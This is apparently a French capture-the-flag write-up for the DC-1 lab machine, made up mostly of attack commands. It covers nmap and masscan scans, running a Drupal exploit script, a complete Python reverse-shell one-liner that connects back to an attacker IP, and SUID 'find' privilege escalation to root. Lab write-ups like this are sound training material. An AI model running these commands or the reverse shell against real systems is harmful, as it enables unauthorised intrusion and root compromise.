# DC-1

    sudo nmap -A -p1-10000 192.168.214.193
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.214.193 -e tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.214.193

Scans classiques.

    whatweb http://192.168.214.193

Le site utilise Drupal, j'ai immédiatement testé le même déroulé que sur Lampiao et cela a marché, j'ai déroulé cette VM en moins de cinq minutes.

    ruby  Drupal.rb http://192.168.214.193
    ...
    DC-1>> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.230",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
    ...
    ls /home
    cat /home/local.txt

Pas besoin de LinPEAS cette fois, la commande **"find"** m'a sauté aux yeux dans les résultats et j'ai juste eu à utiliser la commande habituelle pour l'élévation de privilèges, mais en retirant l'option "-p" qui n'était pas reconnue. 

Voir : https://gtfobins.github.io/gtfobins/find/#suid

    find / -perm /4000 2>/dev/null
    find . -exec /bin/sh \; -quit
    ls /root
    cat /root/proof.txt

